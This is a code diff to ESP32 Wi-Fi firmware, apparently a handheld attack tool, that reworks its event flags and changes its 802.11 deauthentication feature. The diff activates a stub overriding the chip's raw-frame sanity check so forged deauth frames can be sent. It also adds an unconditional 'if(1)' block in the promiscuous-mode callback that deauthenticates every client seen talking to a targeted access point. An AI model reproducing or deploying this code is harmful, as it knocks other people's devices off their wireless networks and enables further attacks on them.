@@ -21,12 +21,12 @@ static const char *TAG_SCAN = "WIFI_SCAN";
 
 QueueHandle_t wifi_task_queue = NULL;
 static EventGroupHandle_t s_wifi_event_group = NULL;
-#define WIFI_INITED_BIT         BIT0 //事件组整合修改
+#define WIFI_INITED_BIT         BIT0
 #define WIFI_CONNECTED_BIT      BIT1
 #define WIFI_FAIL_BIT           BIT2
 #define WIFI_SCAN_BIT           BIT3
 #define WIFI_MONITORING_BIT     BIT4
-#define WIFI_DEAUTH_LOOPING_BIT BIT5
+#define WIFI_DEAUTH_BIT         BIT5
 
 static esp_event_handler_instance_t s_wifi_any_id = NULL;
 static esp_event_handler_instance_t s_wifi_got_ip = NULL;
@@ -53,7 +53,7 @@ static const wifi_sta_connect_t s_wifi_sta_list[] = {
     {"",              ""} /* 结束哨兵 */
 };
 
-//int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){return 0;}
+int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){return 0;}
 
 static void task_wifi_application(void *param);
 
@@ -123,7 +123,7 @@ static void WIFI_EVENTfunction_handler(void* event_handler_arg, esp_event_base_t
         case WIFI_EVENT_STA_START:
         {
             EventBits_t bits = xEventGroupGetBits(s_wifi_event_group);
-            if (bits & (WIFI_SCAN_BIT | WIFI_MONITORING_BIT | WIFI_DEAUTH_LOOPING_BIT)) {
+            if (bits & (WIFI_SCAN_BIT | WIFI_MONITORING_BIT | WIFI_DEAUTH_BIT)) {
                 break;
             }
             s_retry_num = 0;
@@ -134,7 +134,7 @@ static void WIFI_EVENTfunction_handler(void* event_handler_arg, esp_event_base_t
         case WIFI_EVENT_STA_DISCONNECTED:
         {
             EventBits_t bits = xEventGroupGetBits(s_wifi_event_group);
-            if (bits & (WIFI_SCAN_BIT | WIFI_MONITORING_BIT | WIFI_DEAUTH_LOOPING_BIT)) {
+            if (bits & (WIFI_SCAN_BIT | WIFI_MONITORING_BIT | WIFI_DEAUTH_BIT)) {
                 break;
             }
             if (s_retry_num < 2) {
@@ -162,7 +162,7 @@ static void WIFI_EVENTfunction_handler(void* event_handler_arg, esp_event_base_t
 
 void WIFI_init(void)
 {
-    if (s_wifi_event_group != NULL && (xEventGroupGetBits(s_wifi_event_group) & WIFI_INITED_BIT)) { //事件组整合修改
+    if (s_wifi_event_group != NULL && (xEventGroupGetBits(s_wifi_event_group) & WIFI_INITED_BIT)) {
         AMOLED_console_log(INFORM, false, TAG, "STA: already initialized, skip");
         return;
     }
@@ -211,7 +211,7 @@ void WIFI_init(void)
     s_retry_num = 0;
     ESP_ERROR_CHECK(wifi_sta_restart());
 
-    xEventGroupSetBits(s_wifi_event_group, WIFI_INITED_BIT); //事件组整合修改
+    xEventGroupSetBits(s_wifi_event_group, WIFI_INITED_BIT);
     AMOLED_console_log(INFORM, false, TAG, "STA: init done (non-blocking)");
     /* Waiting until either the connection is established (WIFI_CONNECTED_BIT) or connection failed for the maximum
      * number of re-tries (WIFI_FAIL_BIT). The bits are set by event_handler() (see above) */
@@ -276,7 +276,7 @@ static void task_wifi_application(void *param)
 
 void WIFI_deinit(void)
 {
-    if (s_wifi_event_group == NULL || !(xEventGroupGetBits(s_wifi_event_group) & WIFI_INITED_BIT)) { //事件组整合修改
+    if (s_wifi_event_group == NULL || !(xEventGroupGetBits(s_wifi_event_group) & WIFI_INITED_BIT)) {
         AMOLED_console_log(INFORM, false, TAG, "STA: not initialized, skip deinit");
         return;
     }
@@ -649,7 +649,8 @@ void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     // BSSID 过滤：检查是否与任一目标 AP 通信，同时记录方向以提取 STA MAC
     bool match = false;
     bool frame_from_ap = false;
-    for (int i = 0; i < s_target_bssid_count; i++) {
+    int i = 0;
+    for (; i < s_target_bssid_count; i++) {
         if (memcmp(hdr->sa, s_target_bssid_list[i], MAC_LEN) == 0) {
             frame_from_ap = true;
             match = true;
@@ -669,9 +670,13 @@ void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     } else {
         memcpy(sta_mac, hdr->sa, MAC_LEN);
     }
+
+    if(1){//(xEventGroupGetBits(s_wifi_event_group) & WIFI_DEAUTH_BIT) {
+        WIFI_deauth_attack(s_target_bssid_list[i], sta_mac, 0x0002);
+    }
+
     int8_t   rssi   = pkt->rx_ctrl.rssi;
     int64_t  now_us = esp_timer_get_time();
-
     // 去重：已存在的 STA 仅更新面板文字
     int idx = find_sta_by_mac(sta_mac);
     if (idx >= 0) {
@@ -743,7 +748,7 @@ static void _handler_get_status(const wifi_task_queue_message_t *msg)
     EventBits_t bits = (s_wifi_event_group != NULL)
                        ? xEventGroupGetBits(s_wifi_event_group) : 0;
     status.is_monitoring = (bits & WIFI_MONITORING_BIT) != 0;
-    status.is_attacking  = (bits & WIFI_DEAUTH_LOOPING_BIT) != 0;
+    status.is_attacking  = (bits & WIFI_DEAUTH_BIT) != 0;
 
     wifi_ap_record_t ap_info;
     if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
@@ -776,8 +781,8 @@ static void _handler_disconnect(const wifi_task_queue_message_t *msg)
  * @brief 构造并发送单个 802.11 去认证帧 (Deauthentication)
  *
  * @param ap_bssid   目标 AP 的 BSSID (6 字节 MAC 地址，通常为 AP 的 MAC)
- * @param reason_code 去认证原因代码 (主机字节序，函数内部自动转为小端)
  * @param sta_bssid  目标 STA 的 MAC 地址 (6 字节)。为 NULL 时默认广播 FF:FF:FF:FF:FF:FF
+ * @param reason_code 去认证原因代码 (主机字节序，函数内部自动转为小端)
  *
  * @note 发送前请确保 WiFi 已初始化为 STA 模式，且已调用 esp_wifi_set_mode(WIFI_MODE_STA)
  * @note 建议发送前将 WiFi 信道设置为与目标 AP 相同，否则帧可能无法被接收
@@ -842,11 +847,7 @@ static void _handler_deauth_attack(const wifi_task_queue_message_t *msg)
     uint16_t interval = (p->interval_ms > 0) ? p->interval_ms : 100;
 
     if (p->repeat_count == 0) {
-        xEventGroupSetBits(s_wifi_event_group, WIFI_DEAUTH_LOOPING_BIT); //事件组整合修改
-        while (xEventGroupGetBits(s_wifi_event_group) & WIFI_DEAUTH_LOOPING_BIT) { //事件组整合修改
-            WIFI_deauth_attack(p->ap_bssid, NULL, p->reason_code);
-            vTaskDelay(pdMS_TO_TICKS(interval));
-        }
+        xEventGroupSetBits(s_wifi_event_group, WIFI_DEAUTH_BIT);
     } else {
         for (uint16_t i = 0; i < p->repeat_count; i++) {
             WIFI_deauth_attack(p->ap_bssid, NULL, p->reason_code);
